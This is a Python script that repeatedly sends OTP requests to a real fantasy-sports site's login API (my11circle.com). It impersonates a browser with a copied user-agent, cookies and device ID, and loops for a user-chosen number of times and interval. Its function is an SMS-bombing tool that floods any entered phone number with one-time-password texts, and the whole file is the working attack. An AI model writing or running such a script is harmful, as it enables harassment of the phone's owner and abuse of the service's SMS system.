import requests
import time

def send_otp_request(mobile_number, repeat_times, interval):
    url = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Cookie": "sameSiteNoneSupported=true; device.info.cookie={\"bv\":\"125.0.6422.112\",\"bn\":\"Chrome\",\"osv\":\"10\",\"osn\":\"Windows\",\"tbl\":\"false\",\"vnd\":\"false\",\"mdl\":\"false\"}; NA_VISITOR=daca8e58-0933-4d1b-a696-1713aac0431d; SSID=SSID683e9a74-4c6f-4cca-9896-9308c5ce9965; _gid=GA1.2.1862853799.1718736425; optiMonkClientId=1fa9fde4-5566-bb56-73a9-fee280e1eddc; ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.my11circle.com%252F; _ga=GA1.2.1776519827.1718736425; _ga_CBCP2KTYZP=GS1.1.1718736425.1.1.1718736457.0.0.0"
    }
    data = {
        "mobile": mobile_number,
        "deviceId": "e5938362-2ce1-45be-bca9-be1df66d080fe",
        "deviceName": "",
        "refCode": "",
        "isPlaycircle": False
    }
    
    for _ in range(repeat_times):
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            print("OTP request sent successfully.")
        else:
            print("Failed to send OTP request.")
        time.sleep(interval)  # Wait for the specified interval before sending the next request

def main():
    mobile_number = input("Enter your mobile number: ")
    repeat_times = int(input("Enter the number of times to repeat the request: "))
    interval = int(input("Enter the time interval between requests (in seconds): "))
    send_otp_request(mobile_number, repeat_times, interval)

if __name__ == "__main__":
    main()
